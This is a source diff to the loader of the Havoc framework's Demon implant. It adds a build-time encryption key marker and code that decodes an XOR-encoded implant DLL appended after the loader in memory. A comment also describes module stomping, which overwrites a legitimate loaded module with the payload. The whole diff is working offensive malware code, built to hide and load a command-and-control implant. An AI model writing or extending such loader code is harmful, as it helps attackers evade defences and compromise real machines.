@@ -13,8 +13,12 @@
 #define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
 #define STOMP_ENABLED_MARKER    0x0D
 
+// marker the teamserver patches with the payload-encoding key at build time
+#define CRYPT_KEY_MARKER        "HAVOC_CRYPT_KEY_MARKER"
+
 SEC( text, B ) WCHAR gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
 SEC( text, B ) BYTE  gStompEnabled                    = STOMP_ENABLED_MARKER;
+SEC( text, B ) CHAR  gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;
 
 SEC( text, B ) VOID Entry( VOID )
 {
@@ -51,6 +55,30 @@ SEC( text, B ) VOID Entry( VOID )
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
+
+    // Decode the appended (XOR keystream) Demon DLL in place. the teamserver
+    // patched gCryptKey at build time; the encoded DLL directly follows this
+    // loader image in memory. the raw template size is (RawEnd - RawStart):
+    // the same offset the teamserver appends the encoded DLL at.
+    {
+        DWORD   RawSize  = 0;
+        DWORD   RawStart = SecHeader[ 0 ].PointerToRawData;
+        LPVOID  DllStart = NULL;
+        DWORD   DllSize  = 0;
+
+        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
+        {
+            DWORD End = SecHeader[ i ].PointerToRawData + SecHeader[ i ].SizeOfRawData;
+            if ( End > RawSize )
+                RawSize = End;
+        }
+        RawSize -= RawStart;
+
+        DllStart = C_PTR( KaynLibraryLdr + RawSize );
+        DllSize  = KHdrSize + KMemSize;
+
+        CryptDecodeBuffer( DllStart, DllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
+    }
 
     // Optional module stomping: overwrite a legitimate, already-loaded module
     // image with our payload. enabled per-build by the teamserver (gStompEnabled).
